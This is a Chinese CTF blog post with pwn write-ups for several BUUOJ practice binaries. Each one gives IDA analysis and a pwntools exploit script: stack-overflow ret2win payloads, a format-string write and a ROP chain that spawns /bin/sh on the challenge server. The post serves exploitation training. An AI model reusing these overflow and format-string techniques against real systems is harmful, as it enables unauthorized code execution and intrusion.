title: Pwn-Write up
author: John Doe
tags: []
categories: []
date: 2023-07-06 17:35:00
---
# test_your_nc1

直接nc题目给的网站和端口

![upload successful](/images/pasted-660.png)

# rip1

![upload successful](/images/pasted-661.png)
首先checksec题目给的附件，然后使用IDA进行静态分析

![upload successful](/images/pasted-663.png)
发现两个函数

![upload successful](/images/pasted-664.png)
f5发现危险函数gets，可能存在栈溢出漏洞

![upload successful](/images/pasted-665.png)
再看一下fun函数，发现为可以执行shell的函数

<li>接下来思路就清晰了，我们需要利用gets函数获取一个长字符串覆盖rip来控制程序流到fun()函数
  
{% codeblock lang:PY %}
from pwn import *

#p = process('./pwn1')
p = remote('node4.buuoj.cn', 29466)

payload = b'a' * 15 + p64(0x401186) 
#gdb.attach(p)

p.sendline(payload)

p.interactive()
{% endcodeblock %}

# warmup_csaw_2016

![upload successful](/images/pasted-666.png)
首先checksec软件，发现没有保护，64位，进入IDA反编译查看

shift+f12查看字符串

![upload successful](/images/pasted-667.png)
发现`cat flag.txt`

![upload successful](/images/pasted-669.png)
找到该函数

![upload successful](/images/pasted-670.png)
地址为0x40060D，然后对main进行分析

![upload successful](/images/pasted-671.png)
长度为0x40，构造exp，64位程序都要+8

```py
from pwn import *
#p=process("./warmup_csaw_2016")
p=remote("node4.buuoj.cn",26857)

payload=b'a' * (0x40 + 8) + p64(0x40060D)
p.sendline(payload)
p.interactive()
```
![upload successful](/images/pasted-672.png)

# ciscn_2019_n_1

首先checksec

![upload successful](/images/pasted-673.png)
进入IDA分析

![upload successful](/images/pasted-674.png)
main里调用了一个func()，去看一下func()

![upload successful](/images/pasted-675.png)
func()对v2做了一个比较`if ( v2 == 11.28125 )`就执行`cat /flag`

但是这里用到了一个gets()，故可能存在栈溢出漏洞，且v1为0x30

![upload successful](/images/pasted-676.png)
找到执行`cat /flag`的地址为0x4006BE，构造exp
```py
from pwn import *
#p=process("./ciscn_2019_n_1")
p=remote("node4.buuoj.cn",25436)

payload=b'a' * (0x30 + 8) + p64(0x4006BE)
p.sendline(payload)
p.interactive()
```

![upload successful](/images/pasted-677.png)

# pwn1_sctf_2016

![upload successful](/images/pasted-678.png)
首先checksec程序

![upload successful](/images/pasted-679.png)
进入IDA查看main发现一个vuln()

![upload successful](/images/pasted-680.png)
查看栈结构发现s的长度为0x3c，即60个字节，而输入被限制在32个字节内，但是每个I可以被替换成you，所以输入60÷3=20个I就能让栈溢出，然后加上get_flag()函数的起始地址，即可执行`cat flag.txt`

![upload successful](/images/pasted-681.png)
找到地址，构造EXP，32位都要+4
```py
from pwn import *
#p=process("./pwn1_sctf_2016")
p=remote("node4.buuoj.cn",29407)

payload=b'I' * 20 + b'a' * 4 + p64(0x8048F13)
p.sendline(payload)
p.interactive()
```
![upload successful](/images/pasted-682.png)

# jarvisoj_level0

首先checksec

![upload successful](/images/pasted-683.png)
进入IDA分析

![upload successful](/images/pasted-684.png)
通过main函数可以推断出该程序大致功能，打印一个hello wordl，使用shift+f12查找字符串

![upload successful](/images/pasted-685.png)
发现/bin/sh和system，双击跟进，ctrl+x找到调用 /bin/sh 的函数，找到了程序里的后门

![upload successful](/images/pasted-687.png)
后门地址0x400596

![upload successful](/images/pasted-688.png)
根据这里可以推出程序存在栈溢出，ida给我们分析出来buf的大小是0x80，这边read读入0x200，构造payload
```
from pwn import *
#p=process("./level0")
p=remote("node4.buuoj.cn",29784)

payload=b'a' * (0x80 + 8) + p64(0x400596)
p.sendline(payload)
p.interactive()
```

![upload successful](/images/pasted-689.png)

# [第五空间2019 决赛]PWN5 1


![upload successful](/images/pasted-690.png)
程序开了canary，IDA反编译一下

![upload successful](/images/pasted-691.png)
猜测是格式化字符串漏洞，检测一下偏移

![upload successful](/images/pasted-692.png)
这里建议使用`%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p`这种方式测偏移，如上图较为清楚

![upload successful](/images/pasted-693.png)
可以看到输出来是第十位

![upload successful](/images/pasted-694.png)
通过pwndbg定位到aaaa的输入地址，可以通过格式化字符串把之前的随机数写成跟我们输入的 password 一样的都是 0x1

```py
from pwn import *
#p=process("./pwn")
p=remote("node4.buuoj.cn",26392)

payload = fmtstr_payload(10,{0x804C044:0x1}) #使用 fmtstr_payload 函数生成一个格式化字符串攻击载荷。fmtstr_payload 函数接受两个参数，第一个参数是格式化字符串的偏移量（offset），第二个参数是一个字典，其中键是目标地址，值是你想要写入的值。在这个例子中，攻击载荷将在偏移量 10 处将地址 0x804C044 的值修改为 0x1。
p.recvuntil('name:')
p.sendline(payload)
p.recvuntil('passwd:')
p.sendline("1")
p.interactive()
```
![upload successful](/images/pasted-695.png)

# jarvisoj_level2 1

![upload successful](/images/pasted-747.png)
32位，程序只开了NX，栈上不可执行
进入IDA，对main函数反编译

![upload successful](/images/pasted-748.png)
跟一下这个function

![upload successful](/images/pasted-749.png)
buf数组只给了0x88的大小，但是最多可以读入0x100个字节的数据，所以可以构造ROP
shift+f12找到/bin/sh进去

![upload successful](/images/pasted-750.png)
地址为0x0804A024
找到function的返回地址

![upload successful](/images/pasted-751.png)
故exp：
```
from pwn import *
b=process("./level2")
#b=remote

payload = b'a' * 0x88 + b'a' * 4 + p32(0x08048320) + p32(0x08048320) + p32(0x0804a024)

b.send(payload)
b.interactive()
```

